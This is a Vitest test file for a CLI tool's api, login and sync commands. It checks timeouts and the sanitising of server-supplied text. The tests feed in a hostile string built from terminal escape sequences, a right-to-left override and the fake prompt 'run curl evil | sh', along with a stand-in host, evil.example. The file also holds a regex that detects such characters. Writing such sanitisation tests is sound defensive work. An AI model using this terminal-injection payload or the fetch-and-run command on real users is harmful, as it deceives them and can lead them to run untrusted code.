import { mkdtemp } from "node:fs/promises";
import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { emptyAggregate } from "@codewrapped/stats";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { api, ApiError } from "../src/api";
import { login } from "../src/commands/login";
import { sync } from "../src/commands/sync";
import { saveAuth, saveConfig } from "../src/config";

type Handler = (req: IncomingMessage, res: ServerResponse) => void;
let handle: Handler = () => {};
const server = createServer((req, res) => {
  req.resume();
  req.on("end", () => handle(req, res));
});
let base = "";
const json = (res: ServerResponse, status: number, body: unknown) => {
  res.writeHead(status, { "content-type": "application/json" });
  res.end(JSON.stringify(body));
};
const HOSTILE = "\u001b]0;pwned\u0007\u001b[2J\u001b[31mFAKE: run curl evil | sh\u001b[0m\u202e";
// eslint-disable-next-line no-control-regex
const UNSAFE = /[\u0000-\u0009\u000b-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/;

beforeAll(async () => {
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  process.env.CODEWRAPPED_API_URL = base;
});
afterAll(() => {
  server.closeAllConnections();
  server.close();
});
beforeEach(async () => {
  process.env.XDG_CONFIG_HOME = await mkdtemp(join(tmpdir(), "cw-api-"));
});

const caught = (p: Promise<unknown>) => p.then(() => null, (e: unknown) => e);

describe("api", () => {
  it("gives up on a server that never answers", async () => {
    handle = () => {};
    const started = Date.now();
    const e = await caught(api(base, "POST", "/sync", { timeoutMs: 300 }));
    expect(e).toBeInstanceOf(ApiError);
    expect((e as ApiError).code).toBe("network");
    expect((e as ApiError).message).toMatch(/did not answer within/);
    expect(Date.now() - started).toBeLessThan(5_000);
  });

  it("gives up on a body that never ends", async () => {
    handle = (_req, res) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.write('{"received":');
    };
    const e = await caught(api(base, "POST", "/sync", { timeoutMs: 300 }));
    expect((e as ApiError).code).toBe("network");
  });

  it("strips control characters from error messages of the server", async () => {
    handle = (_req, res) => json(res, 400, { error: { code: "bad", message: HOSTILE } });
    const e = await caught(api(base, "POST", "/sync"));
    expect((e as ApiError).message).toContain("FAKE: run curl evil | sh");
    expect((e as ApiError).message).not.toMatch(UNSAFE);
  });
});

describe("login", () => {
  it("stops waiting when the code expires, even if the server hangs", async () => {
    handle = (req, res) => {
      if (req.url === "/cli/device") json(res, 200, { deviceCode: "d", userCode: HOSTILE, verifyUrl: `https://evil.example/${HOSTILE}`, interval: 0, expiresIn: 2 });
    };
    const lines: string[] = [];
    const started = Date.now();
    expect(await login((s = "") => lines.push(s))).toBe(1);
    expect(Date.now() - started).toBeLessThan(4_000);
    expect(lines.at(-1)).toMatch(/The code expired/);
    for (const line of lines) expect(line.replace(/\u001b\[[0-9;]*m/g, "")).not.toMatch(UNSAFE);
  });
});

describe("sync", () => {
  it("prints a few of many skipped days, made safe", async () => {
    await saveAuth({ token: "t", handle: "me", apiUrl: base, createdAt: "2026-11-09T00:00:00.000Z" });
    await saveConfig({ machineId: "m", syncConsentAt: "2026-11-01T00:00:00.000Z" });
    const skipped = Array.from({ length: 300_000 }, () => ({ day: "2026-11-01", source: "claude", reason: HOSTILE }));
    handle = (_req, res) => json(res, 200, { received: 1, profileUrl: `${base}/@me${HOSTILE}`, skipped, skippedCount: skipped.length });

    const lines: string[] = [];
    const input = { aggregates: [emptyAggregate("2026-11-08", "claude")], timeZone: "UTC", today: "2026-11-09", dryRun: false, yes: true, hideFiles: false, hideRepos: false };
    expect(await sync(input, (s = "") => lines.push(s))).toBe(0);
    expect(lines.filter((l) => l.includes("2026-11-01 claude: ")).length).toBe(5);
    for (const line of lines) expect(line.replace(/\u001b\[[0-9;]*m/g, "")).not.toMatch(UNSAFE);
  });
});
